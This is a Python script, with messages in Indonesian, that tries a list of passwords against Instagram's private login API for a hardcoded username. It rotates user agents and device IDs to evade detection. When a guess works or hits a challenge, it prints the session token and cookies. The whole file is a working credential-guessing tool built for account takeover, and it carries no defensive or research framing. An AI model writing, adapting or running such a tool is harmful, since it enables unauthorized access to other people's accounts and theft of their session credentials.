import requests
import random
import time
import uuid
from rich.tree import Tree
from rich.panel import Panel
from rich import print as prints
X_IG_APP_ID = random.choice(["936619743392459" , "2763362503905702" , "1217981644879628"])
IG_API = 'https://i.instagram.com/api/v1/'
IG_URL = 'z.p42.www.instagram.com'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': X_IG_APP_ID,'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '/','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
def UserAgentBarcelona():
    try:
        with open("useragent.txt", "r") as f:
            user_agents = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("File useragent.txt tidak ditemukan.")
        return None
    if not user_agents:
        print("File useragent.txt kosong.")
        return None
    return random.choice(user_agents)
sesi = requests.Session()

def coba_login(username, password_list):
    sesi = requests.Session()
    csrf_response = sesi.get("https://b.i.instagram.com/")
    csrftoken = csrf_response.cookies.get_dict().get("csrftoken", "missing")
    for password in password_list:
        try:
            ua = UserAgentBarcelona()
            device_id = str(uuid.uuid4())
            headers = {
                'User-Agent': ua,
                'X-IG-App-ID': '936619743392459',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': '/',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://i.instagram.com',
                'Referer': 'https://i.instagram.com/',
                'Accept-Language': 'en-US,en;q=0.9',
                "Sec-Ch-Ua-Platform": '"macOS"',
                "Sec-Ch-Ua-Platform-Version": '"14.6.1"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin"
            }
            data = {
                "device_id": device_id,
                "username": username,
                "password": password,
                "_uuid": str(uuid.uuid4()),
                "requestsUUID":str(uuid.uuid4()),
                "_csrftoken": csrftoken,
                "login_attempt_count": 0
            }
            response = sesi.post(
                'https://i.instagram.com/api/v1/accounts/login/',
                data=data,
                headers=headers
            )
            if 'logged_in_user' in response.text:
                tree = Tree(Panel.fit("[green]Login Berhasil[/green]"))
                ig_set_authorization = response.headers.get('ig-set-authorization', 'Tidak Ada')
                cookie = ";".join([key+"="+value.replace('"','') for key, value in sesi.cookies.get_dict().items()])
                tree.add(Panel.fit(f"Username: [green]{username}[/green]"))
                tree.add(Panel.fit(f"Password: [green]{password}[/green]"))
                tree.add(Panel.fit(f"Token: [green]{ig_set_authorization}[/green]"))
                tree.add(Panel.fit(f"Cookie: [green]{cookie}[/green]"))
                prints(tree)
                return  
            elif 'challenge_required' in response.text:
                tree = Tree(Panel.fit("[yellow]Login Challenge Required[/yellow]"))
                cookie = ";".join([key+"="+value.replace('"','') for key, value in sesi.cookies.get_dict().items()])
                tree.add(Panel.fit(f"Username: [yellow]{username}[/yellow]"))
                tree.add(Panel.fit(f"Password: [yellow]{password}[/yellow]"))
                tree.add(Panel.fit(f"User Agent: [yellow]{ua}[/yellow]"))
                tree.add(Panel.fit(f"Cookies Challenge: [yellow]{cookie}[/yellow]"))
                prints(tree)
            elif 'Update your app to log in with two-factor authentication' in response.text:
                tree = Tree(Panel.fit("[yellow]Login Checkpoint Email Validation[/yellow]"))
                cookie = ";".join([key+"="+value.replace('"','') for key, value in sesi.cookies.get_dict().items()])
                tree.add(Panel.fit(f"Username: [yellow]{username}[/yellow]"))
                tree.add(Panel.fit(f"Password: [yellow]{password}[/yellow]"))
                tree.add(Panel.fit(f"User Agent: [yellow]{ua}[/yellow]"))
                tree.add(Panel.fit(f"Cookies Challenge: [yellow]{cookie}[/yellow]"))
                prints(tree)
        except requests.exceptions.RequestException as e:
            prints(f"[red]Terjadi kesalahan saat menghubungi server: {e}[/red]")
# Jalankan login
username = 'kkngksyf_'
passwords = ['SdSk77i8oDS@hXu','apasiko1231']
coba_login(username, passwords)


